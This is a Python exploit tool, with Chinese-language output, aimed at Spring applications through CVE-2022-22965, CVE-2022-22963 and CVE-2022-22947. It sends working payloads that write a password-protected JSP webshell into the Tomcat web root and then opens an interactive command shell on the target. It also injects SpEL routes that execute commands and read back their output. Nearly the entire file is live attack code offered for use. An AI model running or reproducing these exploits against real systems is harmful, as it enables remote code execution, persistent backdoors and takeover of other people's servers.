#!/usr/bin/env python
# coding=utf-8

import requests, sys, json, re, random
from termcolor import cprint
from time import sleep
import urllib3
urllib3.disable_warnings()

ua = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]

def CVE_2022_22965(url, proxies):
    cprint("================开始对目标URL进行CVE-2022-22965漏洞利用================", "green")
    Headers_1 = {
        "User-Agent": random.choice(ua),
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    data1 = payload_linux
    data2 = payload_win
    getpayload = url + payload_http
    try:
        requests.packages.urllib3.disable_warnings()
        requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(1)
        requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(1)
        requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(1)
        test = requests.get(url + "tomcatwar.jsp")
        if (test.status_code == 200) and ('aabysszg' in str(test.text)):
            cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami" ,"red")
            while 1:
                cmd = input("[+] 请输入要执行的命令>>> ")
                url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
                r = requests.get(url_shell)
                resp = r.text
                result = re.findall('([^\x00]+)\n', resp)[0]
                cprint(result ,"green")
        else:
            cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问 [/tomcatwar.jsp?pwd=aabysszg&cmd=命令] \n","yellow")
    except Exception as e:
        print(e)

def CVE_2022_22963(url, proxies):
    cprint("================开始对目标URL进行CVE-2022-22963漏洞利用================", "green")
    payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'

    data = 'test'
    header = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = 'functionRouter'
    url = url + path
    requests.packages.urllib3.disable_warnings()
    req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
    code = req.status_code
    text = req.text
    rsp = '"error":"Internal Server Error"'

    if code == 500 and rsp in text:
        cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹shell', "red")
        print('\n')
    else:
        cprint("[-] CVE-2022-22963漏洞不存在", "yellow")
        print('\n')

def CVE_2022_22947(url, proxies):
    cprint("================开始对目标URL进行CVE-2022-22947漏洞利用================","green")
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    payload = '''{\r
              "id": "hacktest",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''

    requests.packages.urllib3.disable_warnings()
    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
    if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
        cprint("[+] Payload已经输出，回显结果如下：", "red")
        print('\n')
        print(re3.text)
    else:
        cprint("[-] CVE-2022-22947漏洞不存在", "yellow")
        print('\n')

def vul(url,proxies):
    if ('://' not in url):
        url = str("http://") + str(url)
    if str(url[-1]) != "/":
        url = url + "/"
    try:
        requests.packages.urllib3.disable_warnings()
        r = requests.get(url, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
        if r.status_code == 503:
            sys.exit()
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except:
        cprint("[-] URL为 " + url + " 的目标积极拒绝请求，予以跳过！", "magenta")
        sys.exit()
    CVE_2022_22947(url ,proxies)
    CVE_2022_22963(url ,proxies)
    CVE_2022_22965(url ,proxies)
    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
    sys.exit()
